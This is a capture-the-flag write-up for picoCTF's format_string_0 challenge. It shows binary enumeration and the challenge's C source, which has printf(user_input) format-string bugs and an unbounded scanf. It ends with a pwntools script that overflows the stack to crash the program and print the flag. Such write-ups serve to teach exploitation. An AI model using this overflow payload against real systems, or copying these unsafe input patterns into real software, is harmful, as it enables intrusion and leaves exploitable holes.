---
title: format_string_0
description: Writeup for the format_string_0 challenge in picoctf
created: 2025-07-11
tags: pwn, ctf, practice, picoctf, format-string
draft: false
---

<style>
    .ascii-art {
        font-family: monospace;
        white-space: pre;
    }
</style>

# Introduction

-----

**challenge description**
> Can you use your knowledge of format strings to make the customers happy?

**challenge hints**
> This is an introduction of format string vulnerabilities. Look up "format specifiers" if you have never seen them before.
> Just try out the different options

# Enumeration

-----

We start out with enumerating the application given to us:

```bash
$ file ./format-string-0
./format-string-0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=73480d84a806aebddd86602609fcab2052c8fa13, for GNU/Linux 3.2.0, not stripped

$ objdump -t format-string-0 | grep ".text"
00000000004011d0 l     F .text  0000000000000000              deregister_tm_clones
0000000000401200 l     F .text  0000000000000000              register_tm_clones
0000000000401240 l     F .text  0000000000000000              __do_global_dtors_aux
0000000000401270 l     F .text  0000000000000000              frame_dummy
00000000004011c0 g     F .text  0000000000000005              .hidden _dl_relocate_static_pie
0000000000401190 g     F .text  0000000000000026              _start
00000000004012b2 g     F .text  0000000000000064              on_menu
0000000000401316 g     F .text  00000000000000a5              main
00000000004014c3 g     F .text  00000000000000db              serve_bob
00000000004013bb g     F .text  0000000000000108              serve_patrick
0000000000401276 g     F .text  000000000000003c              sigsegv_handler

$ objdump -t format-string-0 | grep ".bss"
0000000000404088 l     O .bss   0000000000000001              completed.0
0000000000404080 g     O .bss   0000000000000008              stdout@GLIBC_2.2.5
00000000004040e0 g       .bss   0000000000000000              _end
0000000000404080 g       .bss   0000000000000000              __bss_start
00000000004040a0 g     O .bss   0000000000000040              flag

$ pwn checksec format-string-0 
[*] '/home/Bugz_-picoctf/format-string-0'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

We are dealing with an ELF x64 binary which is dynamically linked. The ELF is not stripped which means we will aid us during reverse engineering. There are a couple unique symbols in the binary such as `on_menu`, `serve_bob`, `serve_patrick` and of course `main`.

In the .bss section, we see that there is a flag variable. This means that the flag will possible stored globally. 

The application is not compiled with stack canaries which will make any buffer overflows easier to exploit. The NX bit is enabled which means we won't be able to inject shellcode onto the stack. This will limit our exploitation to ROP, ret2libc, or some sort of PLT/GOT overwrite. Lastly, PIE is disabled so we won't have to worry about determining the PIE base address. 

The code is provided so lets jump into that. 

# Code Review

-----

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```


The `main` function opens the flag.txt file, reads the contents of the file into a global buffer call `flag`. A signal handler is then setup where upon receiving a `SIGSEGV`, the program will call `sigsegv_handler` which prints the flag to stdout before exiting. After setting the signal handler, the program calls `serve_patrick` before returning zero.

Within `serve_patrick`, we see that the first thing which occurs is printing an option menu. Then the user is prompted for some input. The user will write their input into `choice2` which is allocated `BUFSIZE` amount of memory where `BUFSIZE` is 32 bytes. 

If what the user inputs is one of the items printed previously, then it is printed to `stdout` here. If the number of bytes written to `stdout` is greater than `2 * BUFFSIZE`, then the `serve_bob` will be invoked which will perform almost an identical routine. 

With the code reviewed, lets talk about some of the bugs within the code. Firstly, the program is called `format_string_0` which implies that the program probably has format string vulnerabilities. There are two format string vulnerabilities contained within this application: One of line 68 and one on line 98. Additionally, there is a buffer overflow vulnerability on line 62 within the `scanf`. (If you follow along with the program and select the correct prompts, you will get the flag. This is because the format string vulnerabilities will cause a SIGSEGV but I'm not interested in the format string vulnerabilities in this challenge. If you want to read more about format strings, look at [pie_time_2](pie_time_2.md))

For those who don't know, `scanf` allows for the program to read in data from `stdin` and store the data according to the format specifier into the location pointed at by the additional argument. A usual implementation of `scanf` looks like the following:

```c
int i = 0;
scanf("%d", &i);
```

This way, `scanf` will be able to interpret the user input and store it at the appropriate location in memory. This format is fairly consistent with almost all data-types EXCEPT for character arrays where the following implementation is correct:

```c
char data[32];
scanf("%31s", data);
```

We don't need to provide the `&` because a character array is already a pointer to an array in memory. Additionally, we need to limit how many characters the user is allowed to input since the space we allocated is finite. We allow the user to input 31 bytes and reserve space for the NULL terminating byte. 

If we look back at the challenge code, `scanf` is implemented as:

```c
scanf("%s", choice1);
```

If the programmer forgets to include the size specifier, then the program will allow the user to write arbitrary amount of data and trigger a buffer overflow. With the buffer overflow, we can overwrite arbitrary amount of memory on the stack. Since we can corrupt the stack, we can overwrite metadata contained on the stack which the program requires to function properly (see [pie_time_2 - exploitation](pie_time_2.md)). 

# Exploitation
-----

The exploitation for this challenge is straightforward. We just need to trigger a `SIGSEGV` to get a flag.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 1337 ./format-string-0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './format-string-0', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()
RET_OFFSET = 56
ADDR = 0xDEADBEEF

payload = flat(
    b"A" * RET_OFFSET, 
    ADDR,
)

io.sendlineafter(b"Enter your recommendation: ", payload)
io.recvline()
io.recvline()
flag = io.recvline().decode("utf-8")

log.success(f"flag: {flag}")

io.close()
```

# References

- https://cplusplus.com/reference/cstdio/scanf/
- https://www.geeksforgeeks.org/c/scanf-in-c/
- https://man7.org/linux/man-pages/man3/scanf.3.html
- https://stackoverflow.com/questions/35734927/vulnerability-using-printf-scanf-and-s
- https://jofrada.pt/mini_articles/C_vulns_scanf
